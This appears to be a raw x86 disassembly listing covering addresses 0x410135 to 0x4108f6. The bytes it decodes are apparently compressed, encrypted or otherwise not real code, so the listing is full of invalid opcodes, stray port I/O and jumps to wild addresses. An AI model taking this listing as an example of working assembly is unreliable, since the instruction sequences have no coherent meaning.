  410135:	push   ecx
  410136:	xor    ecx,esp
  410138:	jne    0x4101a5
  41013a:	shl    DWORD PTR [edx+0x6fc529ac],1
  410140:	xor    eax,0x1c
  410143:	mov    eax,ds:0x99a99bae
  410148:	or     DWORD PTR [edi+esi*1-0x43601570],ebp
  41014f:	xchg   ebp,eax
  410150:	fwait
  410151:	cmp    edi,DWORD PTR [esi]
  410153:	sub    DWORD PTR [edx],edx
  410155:	repz mov ebp,0x460fa9d0
  41015b:	sbb    al,0xa2
  41015d:	xor    eax,0x740f85d9
  410162:	mov    esp,0xba452bcd
  410167:	mov    ch,0xe9
  410169:	icebp  
  41016a:	sbb    eax,0x1f879a84
  41016f:	jae    0x410126
  410171:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  410173:	dec    eax
  410174:	sbb    DWORD PTR [ebx-0x56],0x2dbae8ca
  41017b:	jl     0x410183
  41017d:	sbb    al,0x87
  41017f:	int    0xdb
  410181:	sahf   
  410182:	enter  0xddf1,0x0
  410186:	xchg   edi,eax
  410187:	inc    BYTE PTR [eax]
  410189:	call   0xbd3320d4
  41018e:	dec    ebx
  41018f:	mov    ch,0x2
  410191:	dec    ecx
  410192:	fstp   QWORD PTR [ecx+0x1e]
  410195:	shr    edx,cl
  410197:	js     0x41011e
  410199:	mov    ch,0x4
  41019b:	inc    edi
  41019c:	add    BYTE PTR [edx+eiz*4+0x3146233d],dh
  4101a3:	push   ebp
  4101a4:	pop    edi
  4101a5:	pop    esp
  4101a6:	test   BYTE PTR [edi+ecx*1+0x71],ah
  4101aa:	std    
  4101ab:	loopne 0x4101a4
  4101ad:	xlat   BYTE PTR ds:[ebx]
  4101ae:	pop    ecx
  4101af:	inc    ecx
  4101b0:	dec    edx
  4101b1:	(bad)  
  4101b2:	or     cl,BYTE PTR [ebp+0x73b6a1cf]
  4101b8:	mov    esi,DWORD PTR [edx-0x6159197b]
  4101be:	adc    ebx,DWORD PTR [eax+0x41]
  4101c1:	push   esi
  4101c2:	push   cs
  4101c3:	in     eax,dx
  4101c4:	retf   
  4101c5:	jne    0x4101cf
  4101c7:	pop    es
  4101c8:	add    DWORD PTR [esi+eiz*2+0x6e8e81e0],esi
  4101cf:	sbb    DWORD PTR [eax],edx
  4101d1:	int3   
  4101d2:	add    al,0xdf
  4101d4:	lds    esp,FWORD PTR [ebp-0x236dac85]
  4101da:	adc    dh,BYTE PTR [esp+edx*1-0x4021202c]
  4101e1:	stc    
  4101e2:	fidiv  WORD PTR [ebx]
  4101e4:	mov    ebp,DWORD PTR [eax-0x78698207]
  4101ea:	push   ecx
  4101eb:	and    al,0x2a
  4101ed:	pop    edi
  4101ee:	sbb    edi,DWORD PTR [edi]
  4101f0:	mov    bl,0xc1
  4101f2:	popf   
  4101f3:	mov    ds:0x15eff1bd,eax
  4101f8:	mov    ds:0x4fa9ce69,al
  4101fd:	mov    ch,0xeb
  4101ff:	pop    edx
  410200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410201:	fucomi st,st(3)
  410203:	lea    edx,[ebx+0x43515c40]
  410209:	clc    
  41020a:	loopne 0x4101cb
  41020c:	xchg   ebx,eax
  41020d:	leave  
  41020e:	mov    ch,0xb7
  410210:	inc    esi
  410211:	push   es
  410212:	(bad)  
  410213:	loopne 0x4101ac
  410215:	(bad)  
  410216:	gs aas 
  410218:	loop   0x410216
  41021a:	push   ebx
  41021b:	pop    esi
  41021c:	(bad)  
  41021d:	mov    dl,0x5f
  41021f:	pop    esi
  410220:	xchg   esp,eax
  410221:	jae    0x4101a9
  410223:	cmc    
  410224:	push   edi
  410225:	fs inc ebp
  410227:	ror    BYTE PTR ds:[ecx+ebp*2],cl
  41022b:	in     eax,0xcf
  41022d:	(bad)  
  41022e:	jle    0x410216
  410230:	lods   al,BYTE PTR ds:[esi]
  410231:	mov    eax,ds:0x2582bf9e
  410236:	loope  0x410286
  410238:	cs inc ecx
  41023a:	in     al,dx
  41023b:	mov    WORD PTR [eax],fs
  41023d:	into   
  41023e:	das    
  41023f:	mov    al,0xd2
  410241:	cld    
  410242:	inc    esp
  410243:	pop    ss
  410244:	xorps  xmm5,XMMWORD PTR [ebx+edi*2+0x21]
  410249:	xchg   edi,eax
  41024a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41024b:	ins    DWORD PTR es:[edi],dx
  41024c:	xor    BYTE PTR [ebp+0x481d3810],bl
  410252:	jns    0x410227
  410254:	adc    edi,eax
  410256:	pushf  
  410257:	add    ch,BYTE PTR [edi]
  410259:	jmp    0x8b39068b
  41025e:	jo     0x410249
  410260:	dec    ebx
  410261:	xchg   ebx,eax
  410262:	imul   esi,DWORD PTR [ebx+eiz*2+0x4f],0xedebfc77
  41026a:	icebp  
  41026b:	dec    ecx
  41026c:	ret    
  41026d:	lods   eax,DWORD PTR ds:[esi]
  41026e:	(bad)  
  410270:	jge    0x4102cd
  410272:	aaa    
  410273:	dec    esp
  410274:	shl    BYTE PTR [ecx],1
  410276:	add    eax,ecx
  410278:	leave  
  410279:	push   cs
  41027a:	pop    esi
  41027b:	call   DWORD PTR [ecx+0x24]
  41027e:	dec    ecx
  41027f:	stos   BYTE PTR es:[edi],al
  410280:	adc    eax,0x3d8141b1
  410285:	or     eax,0xf736204f
  41028a:	mov    ds:0xd2921d99,al
  41028f:	retf   
  410290:	sbb    esi,ebp
  410292:	adc    BYTE PTR [ebx+0x49e3c40a],cl
  410298:	stc    
  410299:	call   0xc296b33c
  41029e:	jmp    0x410226
  4102a0:	imul   esp,ecx,0x0
  4102a3:	push   edx
  4102a4:	popf   
  4102a5:	pop    ds
  4102a6:	shl    BYTE PTR [esi+0x46],1
  4102a9:	mov    cl,0xb2
  4102ab:	mov    ax,ds:0x26f4cf11
  4102b1:	leave  
  4102b2:	mov    bl,0x61
  4102b4:	sub    al,0x8c
  4102b6:	ins    DWORD PTR es:[edi],dx
  4102b7:	inc    esp
  4102b8:	mov    al,0xf
  4102ba:	in     al,0x57
  4102bc:	stos   BYTE PTR es:[edi],al
  4102bd:	push   edi
  4102be:	outs   dx,BYTE PTR ds:[esi]
  4102bf:	adc    ah,BYTE PTR [ebx+0x30fa01ff]
  4102c5:	pop    ebp
  4102c6:	push   0xd635bf8
  4102cb:	adc    DWORD PTR [ecx-0xa],edx
  4102ce:	adc    eax,DWORD PTR [esi]
  4102d0:	cwd    
  4102d2:	fdiv   st(4),st
  4102d4:	cmp    al,0x28
  4102d6:	dec    ebp
  4102d7:	push   esi
  4102d8:	cmp    eax,0x10525531
  4102dd:	mov    ds:0x520baaae,eax
  4102e2:	jmp    0x370a1eca
  4102e7:	inc    ebp
  4102e8:	scas   al,BYTE PTR es:[edi]
  4102e9:	mov    cs,esp
  4102eb:	arpl   WORD PTR [edx-0x40],bx
  4102ee:	push   ss
  4102ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102f0:	aad    0x6
  4102f2:	mov    bl,0x2b
  4102f4:	aad    0xd6
  4102f6:	(bad)  
  4102f7:	outs   dx,DWORD PTR ds:[esi]
  4102f8:	xor    eax,0xe6e7a472
  4102fd:	mov    eax,0x17fd9f58
  410302:	sbb    DWORD PTR [edx-0x11],ecx
  410305:	in     al,0xe5
  410307:	mov    eax,ds:0x44acc7f
  41030c:	or     al,0x76
  41030e:	scas   eax,DWORD PTR es:[edi]
  41030f:	ss push ss
  410311:	jmp    DWORD PTR [eax-0x1f24807]
  410317:	jb     0x4102e1
  410319:	or     DWORD PTR [ebx-0x69],0xe77da1b7
  410320:	jns    0x4102ab
  410322:	hlt    
  410323:	hlt    
  410324:	adc    dh,BYTE PTR [eax+0x7db3b592]
  41032a:	dec    esp
  41032b:	or     dh,cl
  41032d:	mov    ds,WORD PTR [ecx]
  41032f:	das    
  410330:	fld    DWORD PTR ds:0x6fbf24ef
  410336:	cmp    al,0x58
  410338:	inc    ebp
  410339:	jb     0x410381
  41033b:	inc    esi
  41033c:	xor    dl,BYTE PTR [ebx]
  41033e:	push   esi
  41033f:	bound  ebx,QWORD PTR [eax-0x37]
  410342:	mov    eax,ds:0x58bf720b
  410347:	jb     0x41039b
  410349:	retf   0xecf3
  41034c:	xor    ecx,ecx
  41034e:	cmp    al,0xb9
  410350:	add    esi,edi
  410352:	loopne 0x410302
  410354:	add    DWORD PTR [ebp-0x2a],eax
  410357:	xlat   BYTE PTR ds:[ebx]
  410358:	xchg   BYTE PTR [ebx-0x35],ch
  41035b:	mov    ds:0xc886593e,eax
  410360:	test   al,0x24
  410362:	scas   al,BYTE PTR es:[edi]
  410363:	fnstenv [edi]
  410365:	mov    esp,0x65223d77
  41036a:	bound  esi,QWORD PTR [ebx-0x62]
  41036d:	jmp    0x4103b2
  41036f:	jmp    0x4555346d
  410374:	(bad)  
  410375:	and    eax,0x6a7f10b0
  41037a:	in     al,dx
  41037b:	out    dx,al
  41037c:	xor    ch,0x6f
  41037f:	nop
  410380:	and    dh,bh
  410382:	out    dx,al
  410383:	xacquire xchg BYTE PTR [ebx],dh
  410386:	and    al,0x17
  410388:	and    BYTE PTR [edi],cl
  41038a:	stos   BYTE PTR es:[edi],al
  41038b:	lods   al,BYTE PTR ds:[esi]
  41038c:	cmp    edi,DWORD PTR [ecx]
  41038e:	icebp  
  41038f:	adc    dh,BYTE PTR [edi-0x34]
  410392:	sbb    bh,bl
  410394:	add    eax,0x5084d89
  410399:	and    BYTE PTR [eax],0x0
  41039c:	add    BYTE PTR [ebx+0xd8bfc45],cl
  4103a2:	add    eax,0x30042fd
  4103a7:	or     eax,0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x58f4:0x29aabab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	imul   ebx,edi,0xffffff8e
  4103dd:	push   ds
  4103de:	ja     0x410447
  4103e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103e1:	data16 shl bh,cl
  4103e4:	pop    es
  4103e5:	and    eax,0x777263f2
  4103ea:	xchg   edx,eax
  4103eb:	mov    DWORD PTR [ecx-0x27578e4e],ecx
  4103f1:	xchg   BYTE PTR [ebp-0x56],dh
  4103f4:	pop    eax
  4103f5:	or     al,0xa1
  4103f7:	mov    ecx,0xbd92332c
  4103fc:	sahf   
  4103fd:	and    ebx,DWORD PTR [ebp+0x75ec2e72]
  410403:	neg    DWORD PTR [esp+esi*2]
  410406:	imul   eax,DWORD PTR [esi+0x21],0x5a14e52e
  41040d:	mov    esp,0x5f466f2c
  410412:	shr    BYTE PTR [ecx+0x75b3014b],1
  410418:	inc    ecx
  410419:	pop    ebx
  41041a:	inc    ecx
  41041b:	call   0x10e909c6
  410420:	dec    edi
  410421:	push   edx
  410422:	mov    esi,0xc179f44a
  410427:	in     eax,0xfa
  410429:	rcr    DWORD PTR [ebp-0x514043b8],1
  41042f:	or     al,0x5e
  410431:	in     eax,0xe5
  410433:	loop   0x41041b
  410435:	lods   al,BYTE PTR ds:[esi]
  410436:	mov    esp,0x84d76ee4
  41043b:	int    0xd
  41043d:	lods   al,BYTE PTR ds:[esi]
  41043e:	imul   edx,eax,0x132565f8
  410444:	cdq    
  410445:	out    0xef,al
  410447:	jne    0x4103d9
  410449:	inc    ebp
  41044a:	adc    DWORD PTR [eax-0x6a],ebx
  41044d:	icebp  
  41044e:	out    dx,al
  41044f:	push   ebp
  410450:	mov    edx,0x8ccfc9af
  410455:	pop    ds
  410456:	cdq    
  410457:	pop    edx
  410458:	loop   0x410417
  41045a:	pop    es
  41045b:	loope  0x41042f
  41045d:	pusha  
  41045e:	jno    0x410458
  410460:	pusha  
  410461:	mov    esi,DWORD PTR [ecx-0x6b]
  410464:	mov    ds:0xa1659bba,eax
  410469:	cmp    edi,DWORD PTR [edi]
  41046b:	ret    0x6503
  41046e:	jbe    0x4104e5
  410470:	adc    al,0x26
  410472:	enter  0x9cee,0xd1
  410476:	add    al,0xef
  410478:	cmp    DWORD PTR [eax-0x29],ebp
  41047b:	mov    dl,0x5a
  41047d:	lods   eax,DWORD PTR ds:[esi]
  41047e:	out    dx,eax
  41047f:	pop    esp
  410480:	mov    ds:0xf704f81f,eax
  410485:	mov    bh,0xe7
  410487:	enter  0x24c5,0xfb
  41048b:	test   eax,0xcfe43c83
  410490:	and    cl,BYTE PTR [ecx]
  410492:	sub    BYTE PTR [edx+0x21],bl
  410495:	and    ah,BYTE PTR [ecx+eiz*8-0x1ae3597c]
  41049c:	icebp  
  41049d:	sti    
  41049e:	loopne 0x4104e0
  4104a0:	mov    al,ds:0xb4821aa2
  4104a5:	pop    ecx
  4104a6:	outs   dx,BYTE PTR ds:[esi]
  4104a7:	mov    ecx,0x3680e54f
  4104ac:	push   ecx
  4104ad:	mov    ah,0x3
  4104af:	shr    DWORD PTR [ecx+0x2921aa0],0x5e
  4104b6:	(bad)  
  4104b7:	repz mov esi,0x794df144
  4104bd:	mov    edi,0xabc6eca3
  4104c2:	pusha  
  4104c3:	retf   
  4104c4:	xchg   edi,eax
  4104c5:	pop    esi
  4104c6:	(bad)  
  4104c7:	or     eax,0x9a16ef2a
  4104cc:	popa   
  4104cd:	sbb    ah,BYTE PTR [eax-0x69]
  4104d0:	leave  
  4104d1:	or     al,0x1d
  4104d3:	mov    ch,cl
  4104d5:	jp     0x4104d6
  4104d7:	rcr    BYTE PTR ds:0xa2d0cc94,1
  4104dd:	retf   0xd447
  4104e0:	jmp    0x292642e8
  4104e5:	(bad)  
  4104e6:	adc    al,0x99
  4104e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104e9:	xchg   esp,eax
  4104ea:	sub    esi,DWORD PTR [edx*2-0x6201809a]
  4104f1:	arpl   WORD PTR [edi],cx
  4104f3:	and    ebx,ecx
  4104f5:	push   0x80e84e0e
  4104fa:	lahf   
  4104fb:	mov    ecx,0xd4c72267
  410500:	xchg   BYTE PTR [edi],dl
  410502:	cs jg  0x4104ac
  410505:	loopne 0x410500
  410507:	push   ebx
  410508:	or     al,0x4b
  41050a:	or     eax,0xe9dfab54
  41050f:	push   eax
  410510:	mov    ecx,0xef431ba5
  410515:	test   bl,dl
  410517:	xor    dl,0x75
  41051a:	xchg   edx,eax
  41051b:	(bad)  
  41051c:	fcmovu st,st(4)
  41051e:	or     DWORD PTR [ecx+0x24],edi
  410521:	call   0xad49:0xb7a97b59
  410528:	ins    BYTE PTR es:[edi],dx
  410529:	lahf   
  41052a:	loop   0x4104e1
  41052c:	pop    edx
  41052d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41052e:	xchg   esp,eax
  41052f:	jnp    0x41054f
  410531:	sub    ebp,ebp
  410533:	(bad)  
  410534:	imul   edi,DWORD PTR [ebp-0x59],0xffffff8b
  410538:	mov    ds:0x46c8551,al
  41053d:	adc    edi,edx
  41053f:	call   0x94b06338
  410544:	scas   eax,DWORD PTR es:[edi]
  410545:	gs jb  0x4104d7
  410548:	icebp  
  410549:	int    0x1f
  41054b:	pop    eax
  41054c:	test   DWORD PTR [eax-0x6b608bd3],0x3cf889d5
  410556:	js     0x410511
  410558:	pop    esi
  410559:	sub    edi,DWORD PTR [ebx+0x50]
  41055c:	or     DWORD PTR [edx],ebp
  41055e:	dec    ebp
  41055f:	inc    eax
  410560:	pop    edi
  410561:	or     ebp,DWORD PTR [esi-0x74]
  410564:	outs   dx,BYTE PTR ds:[esi]
  410565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410566:	cmp    DWORD PTR [ebp+edi*8+0x11],esi
  41056a:	push   eax
  41056b:	or     ah,BYTE PTR [esi]
  41056d:	std    
  41056e:	ins    DWORD PTR es:[edi],dx
  41056f:	(bad)  
  410571:	popa   
  410572:	xchg   ebp,eax
  410573:	adc    esp,ebx
  410575:	jo     0x410528
  410577:	lds    edx,FWORD PTR ds:0x68bc254a
  41057d:	jmp    0x76885362
  410582:	cmp    BYTE PTR [esi],0x1c
  410585:	int3   
  410586:	jge    0x41051c
  410588:	adc    bl,dh
  41058a:	outs   dx,DWORD PTR ds:[esi]
  41058b:	mov    dh,BYTE PTR [ebx+0x41a99613]
  410591:	jmp    0x4105c3
  410593:	fisttp WORD PTR [ecx-0x1e54f2af]
  410599:	addr16 jbe 0x410558
  41059c:	xchg   ebx,eax
  41059d:	int3   
  41059e:	mov    BYTE PTR cs:[eax+0x66b3b6c7],dh
  4105a5:	loopne 0x4105fe
  4105a7:	hlt    
  4105a8:	cdq    
  4105a9:	jmp    0x8ce1021c
  4105ae:	fcomip st,st(7)
  4105b0:	and    al,0xb4
  4105b2:	and    ah,bl
  4105b4:	rcl    BYTE PTR [ecx],0xda
  4105b7:	dec    ecx
  4105b8:	icebp  
  4105b9:	lock sbb eax,0x749618c7
  4105bf:	lahf   
  4105c0:	dec    esp
  4105c1:	leave  
  4105c2:	jmp    0xfbe4:0x737066c9
  4105c9:	(bad)  
  4105ca:	fs stos BYTE PTR es:[edi],al
  4105cc:	jecxz  0x410576
  4105ce:	(bad)  
  4105cf:	(bad)  
  4105d1:	pop    ebx
  4105d2:	push   ebx
  4105d3:	popf   
  4105d4:	(bad)  
  4105d5:	push   ecx
  4105d6:	or     BYTE PTR [ecx-0x67],dh
  4105d9:	lods   al,BYTE PTR cs:[esi]
  4105db:	or     ebp,esp
  4105dd:	mov    eax,ebp
  4105df:	mov    edx,0x3fbf8ba4
  4105e4:	cld    
  4105e5:	ret    0x1b38
  4105e8:	inc    esi
  4105e9:	sbb    ah,cl
  4105eb:	or     bl,BYTE PTR [edx+0x2c3845b]
  4105f1:	sahf   
  4105f2:	hlt    
  4105f3:	push   cs
  4105f4:	dec    ebp
  4105f5:	push   edi
  4105f6:	mov    al,0x3c
  4105f8:	pop    ecx
  4105f9:	xchg   BYTE PTR [eax-0x7b],al
  4105fc:	jmp    0x3827:0x356f82e3
  410603:	popf   
  410604:	fucomip st,st(5)
  410606:	(bad)  
  410607:	bound  ebp,QWORD PTR [esi]
  410609:	ja     0x410651
  41060b:	add    ebp,DWORD PTR [edx]
  41060d:	out    0x46,eax
  41060f:	fisubr WORD PTR [edx-0x23]
  410612:	and    BYTE PTR [edx],dh
  410614:	push   ebp
  410615:	inc    ecx
  410616:	mov    ebx,0xdc16df0a
  41061b:	jnp    0x410666
  41061d:	adc    eax,0xa5b8e7dc
  410622:	mov    ch,BYTE PTR [ecx+0x4]
  410625:	daa    
  410626:	scas   al,BYTE PTR es:[edi]
  410627:	xchg   esi,eax
  410628:	gs jae 0x4106a4
  41062b:	mov    WORD PTR [edx+0x48],ds
  41062e:	iret   
  41062f:	pop    ebp
  410630:	scas   al,BYTE PTR es:[edi]
  410631:	stos   DWORD PTR es:[edi],eax
  410632:	mov    esi,0xbce90666
  410637:	mov    bh,0x9f
  410639:	mov    eax,DWORD PTR [esi+0xc1b2884]
  41063f:	cdq    
  410640:	adc    BYTE PTR [ecx+edx*1+0x10],ch
  410644:	adc    ebp,DWORD PTR [ebp+0x3e]
  410647:	adc    edx,DWORD PTR [edx]
  410649:	add    esi,DWORD PTR [ebx]
  41064b:	int3   
  41064c:	push   ss
  41064d:	jo     0x4105d7
  41064f:	xor    BYTE PTR [edi],bh
  410651:	ins    DWORD PTR es:[edi],dx
  410652:	test   al,0x40
  410654:	xchg   esi,eax
  410655:	mov    ebp,0x285cfcb3
  41065a:	(bad)  
  41065b:	les    ebp,FWORD PTR [ebx-0x6f]
  41065e:	push   ebx
  41065f:	imul   DWORD PTR [ebp+esi*8+0xc]
  410663:	iret   
  410664:	mov    DWORD PTR [esi+ecx*8],edx
  410667:	retw   0xcded
  41066b:	mov    cl,0xa5
  41066d:	outs   dx,BYTE PTR ds:[esi]
  41066e:	popa   
  41066f:	js     0x410698
  410671:	ret    
  410672:	xor    eax,0x3bd81556
  410677:	xchg   esi,eax
  410678:	cwde   
  410679:	daa    
  41067a:	push   ebx
  41067b:	push   0xffffffe9
  41067d:	dec    edi
  41067e:	push   ebx
  41067f:	daa    
  410680:	pop    edi
  410681:	mov    cl,0x7b
  410683:	xchg   edi,eax
  410684:	and    al,0xd8
  410686:	jae    0x4106c9
  410688:	or     al,0xa5
  41068a:	aas    
  41068b:	cmc    
  41068c:	xchg   edi,eax
  41068d:	dec    edx
  41068e:	(bad)  
  41068f:	xor    bh,BYTE PTR [eax+0xa]
  410692:	mov    edx,0xeaf8ed41
  410697:	(bad)  
  410698:	push   esi
  410699:	jl     0x410646
  41069b:	iret   
  41069c:	cmp    DWORD PTR [edi],0xffffffa9
  41069f:	push   es
  4106a0:	cmp    eax,0xea4b376c
  4106a5:	leave  
  4106a6:	adc    ch,cl
  4106a8:	adc    al,bl
  4106aa:	bound  ebx,QWORD PTR [esi-0xb]
  4106ad:	scas   eax,DWORD PTR es:[edi]
  4106ae:	cli    
  4106af:	dec    ecx
  4106b0:	xchg   ecx,eax
  4106b1:	mov    ch,ch
  4106b3:	clc    
  4106b4:	shl    BYTE PTR [bp+si-0x3ba3],0xb4
  4106ba:	xor    eax,0x443b5965
  4106bf:	iret   
  4106c0:	mov    dh,0x4d
  4106c2:	jp     0x410718
  4106c4:	dec    edx
  4106c5:	push   0xffffffbf
  4106c7:	dec    ecx
  4106c8:	stos   BYTE PTR es:[edi],al
  4106c9:	loop   0x410653
  4106cb:	out    0x73,al
  4106cd:	adc    al,0x49
  4106cf:	cwde   
  4106d0:	sahf   
  4106d1:	xor    BYTE PTR [edx+0x2fbc770c],0xd9
  4106d8:	les    edi,FWORD PTR [ebx]
  4106da:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106dc:	cli    
  4106dd:	lock dec ebx
  4106df:	sbb    eax,DWORD PTR [esi+0x31]
  4106e2:	out    dx,al
  4106e3:	test   BYTE PTR [esi+0xd425a82],bl
  4106e9:	sbb    al,0xe7
  4106eb:	adc    dh,BYTE PTR [ebx-0x62538644]
  4106f1:	mov    al,ds:0x79644aa9
  4106f6:	stos   DWORD PTR es:[edi],eax
  4106f7:	push   DWORD PTR [edx+0xc]
  4106fa:	sub    edi,ecx
  4106fc:	adc    al,0x28
  4106fe:	psubd  mm4,QWORD PTR [edi+ecx*4+0x3d]
  410703:	out    0xd2,eax
  410705:	std    
  410706:	call   0x9bd3:0x139b09a3
  41070d:	adc    eax,0xc33ecf96
  410712:	cmp    dh,BYTE PTR [edx]
  410714:	dec    esi
  410715:	ror    BYTE PTR [ebx-0x60],1
  410718:	pop    ecx
  410719:	fstp   st(6)
  41071b:	xchg   DWORD PTR ds:0xfcbf6fde,edi
  410721:	arpl   si,sp
  410723:	cs test al,0x23
  410726:	imul   DWORD PTR [ebp+0x1864d1a2]
  41072c:	ror    BYTE PTR [esi-0x2d2be04f],cl
  410732:	outs   dx,BYTE PTR ds:[esi]
  410733:	sbb    dl,BYTE PTR [ebx+0x638555d5]
  410739:	pop    es
  41073a:	cmp    edi,DWORD PTR [edi-0xb9f1a91]
  410740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410741:	gs int3 
  410743:	(bad)  
  410744:	pop    eax
  410745:	int3   
  410746:	dec    ebx
  410747:	std    
  410748:	sbb    DWORD PTR [ebp-0x7235e787],esp
  41074e:	or     ch,ah
  410750:	dec    edi
  410751:	cs inc esi
  410753:	cmp    dl,bh
  410755:	cdq    
  410756:	scas   al,BYTE PTR es:[edi]
  410757:	sub    esi,eax
  410759:	ins    DWORD PTR es:[edi],dx
  41075a:	jmp    0xad07:0xb0db5075
  410761:	xchg   esi,eax
  410762:	jns    0x4106e7
  410764:	test   al,0x5a
  410766:	jae    0x4107b3
  410768:	popa   
  410769:	int    0x6b
  41076b:	outs   dx,BYTE PTR ds:[esi]
  41076c:	mov    ds:0x3d4c2263,al
  410771:	fldenv [ebx+0x32]
  410775:	sub    BYTE PTR [ebp-0x75511829],cl
  41077b:	ror    DWORD PTR [ebx-0x30a8e29f],cl
  410781:	loope  0x4107ff
  410783:	fwait
  410784:	ja     0x410763
  410786:	das    
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	sbb    ebp,DWORD PTR [esi+0x468b9d59]
  4107ae:	jo     0x410820
  4107b0:	mov    ds:0x9b70707d,eax
  4107b5:	push   ss
  4107b6:	and    bh,ch
  4107b8:	add    al,0x66
  4107ba:	pop    edx
  4107bb:	dec    eax
  4107bc:	arpl   cx,dx
  4107be:	mov    cl,0xa5
  4107c0:	test   BYTE PTR [ebx+0xf2af95b],0x17
  4107c7:	push   0x2292c5cc
  4107cc:	dec    eax
  4107cd:	(bad)  
  4107ce:	jle    0x410827
  4107d0:	aaa    
  4107d1:	popf   
  4107d2:	dec    edx
  4107d3:	std    
  4107d4:	into   
  4107d5:	jecxz  0x41079a
  4107d7:	data16 out dx,al
  4107d9:	in     eax,0xa2
  4107db:	sbb    ah,BYTE PTR [edx]
  4107dd:	mov    ah,0xde
  4107df:	or     al,0x79
  4107e1:	jae    0x4107ad
  4107e3:	dec    edi
  4107e4:	je     0x41076b
  4107e6:	pop    esp
  4107e7:	mov    WORD PTR cs:[eax+0x2f9319d3],ss
  4107ee:	jne    0x41085d
  4107f0:	fs dec ebp
  4107f2:	(bad)  
  4107f4:	std    
  4107f5:	ja     0x4107d2
  4107f7:	repnz inc ecx
  4107f9:	sbb    BYTE PTR [ecx-0x50],ah
  4107fc:	imul   esp,DWORD PTR [ecx+0x69],0xf2b39434
  410803:	fst    DWORD PTR [edi]
  410805:	outs   dx,BYTE PTR ds:[esi]
  410806:	mov    ds,WORD PTR [ebx]
  410808:	data16 fsub DWORD PTR [eax]
  41080b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41080c:	pop    esp
  41080d:	or     al,0xde
  41080f:	sub    dh,ch
  410811:	je     0x410807
  410813:	fidivr WORD PTR [edi-0x7ee8b2]
  410819:	cmp    BYTE PTR [ebp+0x666c76c2],0x1e
  410820:	xor    eax,0xe3902447
  410825:	mov    WORD PTR [ebx],fs
  410827:	shl    BYTE PTR [ebx-0x6b],1
  41082a:	js     0x4107fe
  41082c:	inc    eax
  41082d:	ror    DWORD PTR [ebx+0x2070dce9],0x93
  410834:	push   eax
  410835:	mov    ecx,0xc7629dba
  41083a:	mov    BYTE PTR [ecx-0x52],dh
  41083d:	gs es in eax,dx
  410840:	stc    
  410841:	loopne 0x4107fb
  410843:	add    ecx,ecx
  410845:	ror    eax,1
  410847:	adc    al,0x4b
  410849:	pop    edx
  41084a:	cmp    edi,DWORD PTR [ebp-0x171f8645]
  410850:	clc    
  410851:	lock icebp 
  410853:	jno    0x410837
  410855:	fsubr  QWORD PTR ds:[edi+0x4a]
  410859:	push   edx
  41085a:	pop    eax
  41085b:	cli    
  41085c:	sub    BYTE PTR [esi-0x5b],ch
  41085f:	(bad)  
  410860:	loope  0x4108cc
  410862:	cmp    eax,0x240bd6b1
  410867:	ds in  al,0xeb
  41086a:	in     eax,0x85
  41086c:	jmp    0x410811
  41086e:	icebp  
  41086f:	push   edx
  410870:	inc    ebx
  410871:	cmp    DWORD PTR [eax],0x49fe8e0d
  410877:	cli    
  410878:	push   0xffffff86
  41087a:	push   es
  41087b:	jno    0x4108cd
  41087d:	aad    0xcc
  41087f:	fwait
  410880:	or     DWORD PTR [eax],ecx
  410882:	scas   eax,DWORD PTR es:[edi]
  410883:	dec    ecx
  410884:	jl     0x4108e0
  410886:	pop    edi
  410887:	imul   esp,DWORD PTR [edx],0x7
  41088a:	fs aaa 
  41088c:	mov    ds:0x50ee17a3,al
  410891:	iret   
  410892:	sbb    ebx,edx
  410894:	dec    ecx
  410895:	clc    
  410896:	leave  
  410897:	add    eax,0x36cbf673
  41089c:	xchg   esi,eax
  41089d:	lods   al,BYTE PTR ds:[esi]
  41089e:	dec    eax
  41089f:	fisubr WORD PTR [ecx+eiz*8-0x25022fab]
  4108a6:	and    dl,BYTE PTR [ebx-0x714ef62]
  4108ac:	bound  ecx,QWORD PTR [esi+0x37]
  4108af:	ror    esi,cl
  4108b1:	jb     0x4108b6
  4108b3:	mov    ebx,0x4666d922
  4108b8:	xor    BYTE PTR [ebx+0x5cbb7562],0x13
  4108bf:	arpl   dx,ax
  4108c1:	pop    ss
  4108c2:	inc    edx
  4108c3:	int3   
  4108c4:	cmc    
  4108c5:	lods   al,BYTE PTR ds:[esi]
  4108c6:	pop    esp
  4108c7:	jae    0x4108b6
  4108c9:	sub    ecx,DWORD PTR [ebp+0xb]
  4108cc:	popf   
  4108cd:	popf   
  4108ce:	xlat   BYTE PTR ds:[ebx]
  4108cf:	rcl    esi,0x57
  4108d2:	jns    0x410875
  4108d4:	pop    edx
  4108d5:	cld    
  4108d6:	xor    eax,0x51073c6e
  4108db:	ja     0x4108b7
  4108dd:	fisubr WORD PTR [eax]
  4108df:	xor    eax,0xf8f1a7e
  4108e4:	imul   edx,DWORD PTR ds:0x96268fe4,0xffffff9f
  4108eb:	xchg   DWORD PTR [edx+ebp*2-0x6],edi
  4108ef:	sbb    DWORD PTR [ebx],0x939869d3
  4108f5:	dec    ebx
  4108f6:	in     al,0x98
